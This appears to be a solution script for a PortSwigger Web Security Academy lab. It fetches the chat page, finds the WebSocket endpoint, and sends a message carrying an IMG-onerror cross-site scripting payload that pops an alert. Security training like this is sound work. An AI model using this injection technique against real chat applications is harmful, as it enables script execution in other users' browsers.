# usage:
# python3 1.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import http.client
import json
from argparse import ArgumentParser

import requests
from bs4 import BeautifulSoup
from websockets.sync.client import connect

http.client.HTTPConnection.debuglevel = 1


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.s = None

    def solve(self) -> None:
        self.s = requests.Session()
        r = self.s.get(f"{self.url}/chat")
        ws_url = (
            BeautifulSoup(r.content, "html.parser").find(id="chatForm").get("action")
        )

        with connect(ws_url) as ws:
            message = {
                "message": "<IMG SRC=/ onerror='alert(String.fromCharCode(88,83,83))'></IMG>"
            }
            ws.send(json.dumps(message))


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
